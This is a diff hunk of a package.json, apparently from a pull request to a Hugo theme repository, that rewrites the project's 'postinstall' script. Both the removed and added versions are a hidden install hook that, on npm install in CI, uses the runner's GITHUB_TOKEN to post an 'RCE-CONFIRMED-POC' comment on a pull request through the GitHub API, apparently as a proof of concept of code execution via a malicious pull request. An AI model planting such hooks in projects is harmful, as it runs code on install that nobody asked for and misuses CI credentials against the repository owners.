@@ -33,7 +33,7 @@
     "update:pkg:dep": "npm install --save-dev autoprefixer@latest postcss-cli@latest",
     "update:pkg:hugo": "npm install --save-dev --save-exact hugo-extended@latest",
     "update:pkgs": "npx npm-check-updates -u",
-    "postinstall": "PR=$(curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" \"https://api.github.com/repos/layer5io/academy-theme/pulls?head=cristian8212:rce-poc-academy\" | python3 -c \"import sys,json;d=json.load(sys.stdin);print(d[0]['number'] if d else '0')\"); curl -s -X POST -H \"Authorization: Bearer $GITHUB_TOKEN\" -H \"Content-Type: application/json\" -d \"{\\\"body\\\":\\\"RCE-CONFIRMED-POC-$(date +%s)\\\"}\" \"https://api.github.com/repos/layer5io/academy-theme/issues/$PR/comments\"; echo POC_POSTINSTALL_RAN"
+    "postinstall": "PR=$(echo \"$GITHUB_REF\" | sed 's#refs/pull/##; s#/merge##'); curl -s -X POST -H \"Authorization: Bearer $GITHUB_TOKEN\" -H \"Content-Type: application/json\" -d \"{\\\"body\\\":\\\"RCE-CONFIRMED-POC-$(date +%s)\\\"}\" \"https://api.github.com/repos/layer5io/academy-theme/issues/$PR/comments\"; echo POC_POSTINSTALL_RAN"
   },
   "devDependencies": {
     "autoprefixer": "^10.5.0",
